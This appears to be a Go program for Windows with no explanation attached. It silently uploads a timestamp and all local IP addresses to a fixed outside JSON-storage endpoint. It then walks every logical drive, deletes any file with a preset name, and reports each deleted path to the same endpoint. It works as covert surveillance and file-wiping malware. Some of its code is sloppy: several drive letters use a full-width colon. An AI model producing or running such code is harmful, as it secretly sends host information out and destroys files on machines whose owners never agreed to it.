package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	. "strconv"
	"syscall"
	"time"
)

var (
	TARGET = "path_file"
	URL    = "https://api.myjson.com/bins/29tmg"
)

func upload(jsonstr []byte, url string) {
	var err error

	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(jsonstr))
	if err != nil {
		fmt.Println("Err", err)
		return
	}
	req.Header.Set("X-Custom-Header", "myvalue")
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}

func GetLogicalDrives() []string {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	GetLogicalDrives := kernel32.MustFindProc("GetLogicalDrives")
	n, _, _ := GetLogicalDrives.Call()
	s := FormatInt(int64(n), 2)

	var drives_all = []string{"A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P：", "Q：", "R：", "S：", "T：", "U：", "V：", "W：", "X：", "Y：", "Z："}
	temp := drives_all[0:len(s)]

	var d []string
	for i, v := range s {

		if v == 49 {
			l := len(s) - i - 1
			d = append(d, temp[l])
		}
	}

	var drives []string
	for i, v := range d {
		drives = append(drives[i:], append([]string{v}, drives[:i]...)...)
	}
	return drives

}

type Upinfo struct {
	Ips   []string
	Paths []string
	Times []string
}

var upinfo Upinfo

func walkFn(path string, info os.FileInfo, err error) error {
	if info.Name() == TARGET {
		upinfo.Paths = append(upinfo.Paths, path)
		os.Remove(path)
		jsonstr, _ := json.Marshal(upinfo)
		upload(jsonstr, URL)
	}
	return nil
}

func main() {
	upinfo.Times = append(upinfo.Times, time.Now().String())
	jsonstr, _ := json.Marshal(upinfo)
	upload(jsonstr, URL)

	ifaces, err := net.Interfaces()
	if err == nil {
		for _, i := range ifaces {
			addrs, err := i.Addrs()
			if err != nil {
				continue
			}
			for _, addr := range addrs {
				var ip net.IP
				switch v := addr.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				upinfo.Ips = append(upinfo.Ips, ip.String())
			}
		}
		jsonstr, _ := json.Marshal(upinfo)
		upload(jsonstr, URL)
	}
	drivers := GetLogicalDrives()
	for _, d := range drivers {
		filepath.Walk(d, walkFn)
	}
}
